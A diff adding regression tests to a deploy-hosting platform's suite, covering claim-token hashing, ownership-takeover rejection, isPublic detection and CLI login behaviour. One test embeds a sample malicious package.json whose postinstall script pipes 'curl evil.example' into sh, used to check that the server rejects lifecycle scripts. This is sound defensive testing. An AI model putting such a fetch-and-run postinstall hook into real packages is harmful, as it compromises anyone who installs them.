@@ -45,8 +45,11 @@ export default capsule({
 })
 `
 
-function tinySourceFiles(serverSrc = TINY_SERVER_SRC) {
-  return { "server/index.ts": serverSrc, "package.json": '{"name":"test-cap","private":true,"type":"module"}\n' }
+function tinySourceFiles(serverSrc = TINY_SERVER_SRC, pkgJson) {
+  return {
+    "server/index.ts": serverSrc,
+    "package.json": pkgJson ?? '{"name":"test-cap","private":true,"type":"module"}\n',
+  }
 }
 
 let hostProc = null
@@ -145,6 +148,45 @@ test("deploy create with admin token succeeds and returns subdomain URL", async 
   assert.ok(typeof body.bundleBytes === "number" && body.bundleBytes > 0, "bundleBytes returned")
   deployId = body.deployId
   claimToken = body.claimToken
+})
+
+test("GET /ide/:deployId bootstraps with lastBuild metadata persisted on the record", async () => {
+  // Regression for the IDE diagnostics tile showing "No build yet" after a
+  // page reload on an already-deployed project. The control plane must
+  // surface bundleBytes / bundleHash / lastBuiltAt from the persisted
+  // record in window.__POND_IDE so the IDE seeds its lastBuild state on
+  // first mount instead of starting empty.
+  // publicHost is "localhost" in this suite; we need to spoof Host header
+  // because fetch() against 127.0.0.1 would not hit the bare-host branch.
+  const http = await import("node:http")
+  const result = await new Promise((resolve, reject) => {
+    const req = http.request(
+      {
+        host: "127.0.0.1",
+        port,
+        method: "GET",
+        path: `/ide/${deployId}`,
+        headers: { host: `${publicHost}:${port}` },
+      },
+      (res) => {
+        let data = ""
+        res.on("data", (c) => (data += c))
+        res.on("end", () => resolve({ status: res.statusCode, body: data }))
+      },
+    )
+    req.on("error", reject)
+    req.end()
+  })
+  assert.equal(result.status, 200)
+  const m = result.body.match(/window\.__POND_IDE = (\{[^<]+?\})\s*<\/script>/)
+  assert.ok(m, "bootstrap object missing from /ide html")
+  const bootstrap = JSON.parse(m[1])
+  assert.equal(bootstrap.deployId, deployId)
+  assert.ok(bootstrap.lastBuild, "bootstrap.lastBuild should be populated after a fresh deploy create")
+  assert.ok(typeof bootstrap.lastBuild.bundleBytes === "number" && bootstrap.lastBuild.bundleBytes > 0)
+  assert.ok(typeof bootstrap.lastBuild.bundleHash === "string" && bootstrap.lastBuild.bundleHash.length === 64)
+  assert.ok(typeof bootstrap.lastBuild.builtAt === "string" && bootstrap.lastBuild.builtAt.length > 0)
+  assert.ok(typeof bootstrap.lastBuild.durationMs === "number" && bootstrap.lastBuild.durationMs >= 0)
 })
 
 test("subdomain Host header reaches the deploy via proxy", async () => {
@@ -254,6 +296,145 @@ test("bare domain GET /.well-known/security.txt serves a valid file", async () =
   assert.match(result.ct, /text\/plain/)
   assert.match(result.body, /Contact:/)
   assert.match(result.body, /Expires:/)
+})
+
+test("persisted deploy record holds claimTokenHash, not plaintext claimToken (regression)", async () => {
+  // MEDIUM-2 fix: the plaintext claim token is returned to the client at
+  // create time (one-time disclosure) but the on-disk meta.json must hold
+  // only the sha256 hash. A backup leak of the data dir should not yield
+  // any usable claim tokens.
+  const { readFileSync, existsSync, readdirSync } = await import("node:fs")
+  const path = await import("node:path")
+  // The deploy record is at <dataDir>/deploys/<deployId>/deploy.json
+  const metaPath = path.join(dataDir, "deploys", deployId, "deploy.json")
+  assert.ok(
+    existsSync(metaPath),
+    `deploy.json missing at ${metaPath} (dir has: ${readdirSync(path.join(dataDir, "deploys", deployId)).join(", ")})`,
+  )
+  const meta = JSON.parse(readFileSync(metaPath, "utf-8"))
+  assert.equal(meta.claimToken, undefined, "plaintext claimToken should not be persisted")
+  assert.ok(
+    typeof meta.claimTokenHash === "string" && meta.claimTokenHash.length === 64,
+    "claimTokenHash should be a sha256 hex",
+  )
+
+  const { createHash } = await import("node:crypto")
+  const expected = createHash("sha256").update(claimToken).digest("hex")
+  assert.equal(
+    meta.claimTokenHash,
+    expected,
+    "stored hash should match sha256 of the plaintext token returned to client",
+  )
+})
+
+test("POST /api/deploys with package.json containing lifecycle scripts is REJECTED (supply-chain)", async () => {
+  // LOW-7 fix. Even though the host builds via esbuild and never runs
+  // `npm install`, an uploaded package.json with a postinstall script becomes
+  // a supply-chain weapon for anyone who later forks the deploy.
+  const malicious = JSON.stringify({
+    name: "evil",
+    type: "module",
+    scripts: { postinstall: "node -e \"require('child_process').execSync('curl evil.example|sh')\"" },
+  })
+  const res = await fetch(`${apiUrl}/api/deploys`, {
+    method: "POST",
+    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
+    body: JSON.stringify({ sourceFiles: tinySourceFiles(undefined, malicious) }),
+  })
+  assert.equal(res.status, 400, `expected 400, got ${res.status}`)
+  const body = await res.json()
+  assert.match(body.error, /lifecycle script/i)
+  assert.match(body.error, /postinstall/)
+})
+
+test("PUT /api/deploys/:id/files/package.json with lifecycle scripts is REJECTED", async () => {
+  // Same rule, single-file IDE PUT path. Defense in depth.
+  const malicious = JSON.stringify({
+    name: "evil",
+    type: "module",
+    scripts: { preinstall: "echo pwned" },
+  })
+  const res = await fetch(`${apiUrl}/api/deploys/${deployId}/files/package.json`, {
+    method: "PUT",
+    headers: { "content-type": "text/plain", authorization: `Bearer ${adminToken}` },
+    body: malicious,
+  })
+  assert.equal(res.status, 400, `expected 400, got ${res.status}`)
+  const body = await res.json()
+  assert.match(body.error, /lifecycle script/i)
+  assert.match(body.error, /preinstall/)
+})
+
+test("isPublic detection ignores `public: true` inside comments and string literals", async () => {
+  // LOW-1 fix. Pre-0.3.11, the regex scanned raw source, so a docstring or
+  // commented-out example marked the deploy as public — exposing source via
+  // /gallery and /api/public-deploys/:id/source.
+  const innocuous = `import { capsule, mutation, query, string, table } from "pond/server"
+// Example from the docs: \`capsule({ public: true, ... })\` makes a deploy public.
+// This deploy is NOT public — the string "public: true" only appears in this comment.
+const NOTE = "see the docs example: public: true"
+export default capsule({
+  title: "Private Box",
+  description: "Owner-only",
+  schema: { items: table({ name: string() }) },
+  queries: { items: query((ctx) => ctx.db.items.all()) },
+  mutations: { add: mutation((ctx, name) => ctx.db.items.insert({ name })) },
+})
+`
+  const create = await fetch(`${apiUrl}/api/deploys`, {
+    method: "POST",
+    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
+    body: JSON.stringify({ sourceFiles: tinySourceFiles(innocuous) }),
+  })
+  assert.equal(create.status, 201)
+  const cb = await create.json()
+
+  const list = await fetch(`${apiUrl}/api/public-deploys`)
+  const lb = await list.json()
+  const found = lb.deploys.find((d) => d.deployId === cb.deployId)
+  assert.equal(found, undefined, "deploy with `public: true` only in comments must NOT appear in public listing")
+
+  // And the source fetch should 404 too.
+  const src = await fetch(`${apiUrl}/api/public-deploys/${cb.deployId}/source`)
+  assert.equal(src.status, 404, "source endpoint must 404 for non-public deploys")
+})
+
+test("re-claim of an already-owned deploy by a different user with a stolen claim token is REJECTED", async () => {
+  // Regression for the 0.3.8 takeover bug: anyone who possessed a deploy's
+  // claim token (which is stored plaintext on disk and was previously in the
+  // browser's localStorage) could POST /api/deploys/<id>/claim with their own
+  // bearer token and silently transfer ownership away from the current owner.
+  // After the fix, the cross-owner transfer must return 403.
+  //
+  // Setup: the deploy created in the test above is owned by `admin`. Create
+  // a second non-admin user and try to re-claim it with the admin's claim
+  // token + the new user's bearer.
+  const attackerSignup = await fetch(`${apiUrl}/api/users`, {
+    method: "POST",
+    headers: { "content-type": "application/json", authorization: `Bearer ${hostToken}` },
+    body: JSON.stringify({ username: "attacker" }),
+  })
+  assert.equal(attackerSignup.status, 201)
+  const { token: attackerToken } = await attackerSignup.json()
+
+  const res = await fetch(`${apiUrl}/api/deploys/${deployId}/claim`, {
+    method: "POST",
+    headers: { "content-type": "application/json", authorization: `Bearer ${attackerToken}` },
+    body: JSON.stringify({ claimToken }),
+  })
+  assert.equal(res.status, 403, `expected 403, got ${res.status}: ${await res.text()}`)
+})
+
+test("re-claim by the same owner with their own bearer is allowed (cross-machine login)", async () => {
+  // The fix above must NOT break the legitimate "I'm reattaching from a new
+  // machine as the existing owner" flow — admin owns the deploy, so this
+  // should succeed.
+  const res = await fetch(`${apiUrl}/api/deploys/${deployId}/claim`, {
+    method: "POST",
+    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
+    body: JSON.stringify({ claimToken }),
+  })
+  assert.equal(res.status, 200, `expected 200, got ${res.status}: ${await res.text()}`)
 })
 
 test("wrong user token → 401 on POST /api/deploys", async () => {
@@ -1735,6 +1916,129 @@ test("`pond fork <url>` scaffolds a local copy from a public deploy", async () =
   } finally {
     rmSync(parent, { recursive: true, force: true })
   }
+})
+
+test("pond login (no --token) reuses a saved credential and validates against /api/users/me", async () => {
+  // 0.3.13 fix. Setup: write a credential to a sandboxed HOME pointing at
+  // the running test host, then spawn `pond login` with that HOME. Expect
+  // exit 0 + "Already logged in" output (NOT the "Need a token" wall).
+  const { execFile } = await import("node:child_process")
+  const { promisify } = await import("node:util")
+  const { mkdtempSync, mkdirSync, writeFileSync } = await import("node:fs")
+  const { tmpdir } = await import("node:os")
+  const execFileP = promisify(execFile)
+
+  const sandboxHome = mkdtempSync(path.join(tmpdir(), "pond-login-sandbox-"))
+  mkdirSync(path.join(sandboxHome, ".pond"), { recursive: true })
+  writeFileSync(
+    path.join(sandboxHome, ".pond", "credentials.json"),
+    JSON.stringify({
+      credentials: [
+        {
+          apiUrl,
+          username: "admin",
+          token: adminToken,
+          isAdmin: true,
+          savedAt: new Date().toISOString(),
+        },
+      ],
+    }),
+    { mode: 0o600 },
+  )
+
+  const { stdout, stderr } = await execFileP(process.execPath, [CLI_PATH, "login", "--api", apiUrl], {
+    env: { ...process.env, HOME: sandboxHome },
+    timeout: 10000,
+  })
+  const out = stdout + stderr
+  assert.match(out, /Already logged in as admin/, `expected "Already logged in" in output, got: ${out}`)
+  assert.match(out, /credential from ~\/\.pond\/credentials\.json/)
+  assert.doesNotMatch(out, /Need a token/, "must NOT show the old 'Need a token' wall")
+})
+
+test("pond login surfaces saved credential offline (transient network failure does NOT block usage)", async () => {
+  // The validation call falls back to "trust the saved cred, warn" when the
+  // server is unreachable. Without this, users behind a flaky network would
+  // be locked out of perfectly valid local credentials.
+  const { execFile } = await import("node:child_process")
+  const { promisify } = await import("node:util")
+  const { mkdtempSync, mkdirSync, writeFileSync } = await import("node:fs")
+  const { tmpdir } = await import("node:os")
+  const execFileP = promisify(execFile)
+
+  const sandboxHome = mkdtempSync(path.join(tmpdir(), "pond-login-offline-"))
+  // Point at a port that nothing is listening on. Port 1 is reserved (RFC
+  // 1700) and refuses connections on macOS/Linux without root.
+  const unreachable = "http://127.0.0.1:1"
+  mkdirSync(path.join(sandboxHome, ".pond"), { recursive: true })
+  writeFileSync(
+    path.join(sandboxHome, ".pond", "credentials.json"),
+    JSON.stringify({
+      credentials: [
+        {
+          apiUrl: unreachable,
+          username: "offline-user",
+          token: "fake-token-doesnt-matter",
+          isAdmin: false,
+          savedAt: new Date().toISOString(),
+        },
+      ],
+    }),
+    { mode: 0o600 },
+  )
+
+  const { stdout, stderr } = await execFileP(process.execPath, [CLI_PATH, "login", "--api", unreachable], {
+    env: { ...process.env, HOME: sandboxHome },
+    timeout: 10000,
+  })
+  const out = stdout + stderr
+  assert.match(out, /Saved credential for offline-user/, `expected saved-cred surface, got: ${out}`)
+  assert.match(out, /could not validate/, "should explain why no validation happened")
+  assert.doesNotMatch(out, /no longer validates/, "must NOT print the auth-failure message on network error")
+})
+
+test("pond login rejects a saved credential the server actively returned 401 for", async () => {
+  // Distinct from the offline case: a server-side 401 means the token has
+  // been rotated or revoked. We must NOT silently use it. Use a known-bad
+  // bearer against the running test host.
+  const { execFile } = await import("node:child_process")
+  const { promisify } = await import("node:util")
+  const { mkdtempSync, mkdirSync, writeFileSync } = await import("node:fs")
+  const { tmpdir } = await import("node:os")
+  const execFileP = promisify(execFile)
+
+  const sandboxHome = mkdtempSync(path.join(tmpdir(), "pond-login-revoked-"))
+  mkdirSync(path.join(sandboxHome, ".pond"), { recursive: true })
+  writeFileSync(
+    path.join(sandboxHome, ".pond", "credentials.json"),
+    JSON.stringify({
+      credentials: [
+        {
+          apiUrl,
+          username: "ghost",
+          token: "definitely-not-a-real-token-and-the-server-will-401",
+          isAdmin: false,
+          savedAt: new Date().toISOString(),
+        },
+      ],
+    }),
+    { mode: 0o600 },
+  )
+
+  await assert.rejects(
+    () =>
+      execFileP(process.execPath, [CLI_PATH, "login", "--api", apiUrl], {
+        env: { ...process.env, HOME: sandboxHome },
+        timeout: 10000,
+      }),
+    (err) => {
+      assert.equal(err.code, 1)
+      const out = (err.stdout ?? "") + (err.stderr ?? "")
+      assert.match(out, /no longer validates/, `expected stale-cred message, got: ${out}`)
+      assert.match(out, /server said 401/)
+      return true
+    },
+  )
 })
 
 test("SIGINT host leaves no orphan deploy-worker processes", async () => {
